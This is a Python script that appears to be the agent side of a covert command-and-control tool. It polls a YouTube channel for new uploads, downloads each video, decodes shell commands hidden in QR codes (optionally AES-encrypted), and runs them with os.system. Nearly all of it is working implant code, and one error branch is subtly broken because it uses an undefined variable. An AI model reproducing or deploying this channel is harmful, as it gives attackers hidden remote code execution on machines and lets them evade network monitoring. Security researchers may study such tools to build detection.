from __future__ import unicode_literals
import read_file
import youtube_dl
import datetime
import urllib
import config
import json
import time
import sys
import os

debug = config.debug


def get_first_video_in_channel(api_key, channel_id):
	base_video_url = 'https://www.youtube.com/watch?v='
	base_search_url = 'https://www.googleapis.com/youtube/v3/search?'
	url = base_search_url + "part=snippet&channelId={}&maxResults=1&order=date&type=video&key={}".format(channel_id,api_key)
	inp = urllib.request.urlopen(url)
	resp = json.load(inp)
	if (resp['items'] != []):
		title = resp['items'][0]['snippet']['title']
		video_id = resp['items'][0]['id']['videoId']
		video_url = base_video_url + video_id
		now = datetime.datetime.now()
		if debug: print("[%02d:%02d:%02d] Last video title: %s" % (now.hour,now.minute,now.second,title))
		if debug: print("[%02d:%02d:%02d] Last video url:   %s" % (now.hour,now.minute,now.second,video_url))
		return video_url
	else:
		if debug: print("[%02d:%02d:%02d] No videos uploaded yet" % (now.hour,now.minute))
		return ""


def download_video(video_url, downloaded_video_path):
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] New video! Downloading file to: %s"%(now.hour,now.minute,now.second,downloaded_video_path))
	ydl_opts = {'outtmpl': downloaded_video_path, 'quiet': 'any_printing'}
	with youtube_dl.YoutubeDL(ydl_opts) as ydl:
		ydl.download([video_url])
	

def analyze(downloaded_video_path):
	data_type = config.data_type
	if data_type == "video":
		commands = read_file.read_video("qr", downloaded_video_path, "/tmp/")
	elif data_type == "video_encrypted":
		commands = read_file.read_video("qr_aes", downloaded_video_path, "/tmp/")
	return commands


def execute_commands(commands):
	for cmd_ in commands:
		now = datetime.datetime.now()
		if debug: print("[%02d:%02d:%02d] Command: %s"%(now.hour,now.minute,now.second,cmd_))
		os.system(cmd_)


def wait_for_upload(original_video_url, api_key, channel_id, delay_seconds, downloaded_video_path):
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
	while True:
		time.sleep(delay_seconds)
		video_url = get_first_video_in_channel(api_key, channel_id)
		if video_url != original_video_url:
			now = datetime.datetime.now()
			download_video(video_url, downloaded_video_path)
			time.sleep(5)
			commands = analyze(downloaded_video_path)
			if commands == "unknown_type":
				if debug: print("[-] Error: Unknown type of video")
				break
			execute_commands(commands)
			os.remove(downloaded_video_path)
			original_video_url = video_url
		else:
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] No new video uploaded. Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))


def main():
	delay_seconds = config.delay_seconds
	downloaded_video_path = "./test.mp4"
	if len(sys.argv) == 3:
		channel_id = sys.argv[1]
		api_key = sys.argv[2]
	else:
		channel_id = config.youtube_channel_id
		api_key = config.youtube_api_key
	if channel_id == "" or api_key == "":
		print("[-] ERROR: It is necessary to use the Youtube channel ID and the API key as input parameters or add the values to the parameters 'youtube_channel_id' and 'youtube_api_key' in config.py")
		sys.exit(1)
	data_type = config.data_type
	if data_type != "video" and data_type != "video_encrypted":
		print("[-] ERROR: Unsupported value for data_type. For the Youtube option it should be 'video' or 'video_encrypted'")
		sys.exit(1)
	original_video_url = get_first_video_in_channel(api_key, channel_id)
	wait_for_upload(original_video_url, api_key, channel_id, delay_seconds, downloaded_video_path)


if __name__== "__main__":
	main()
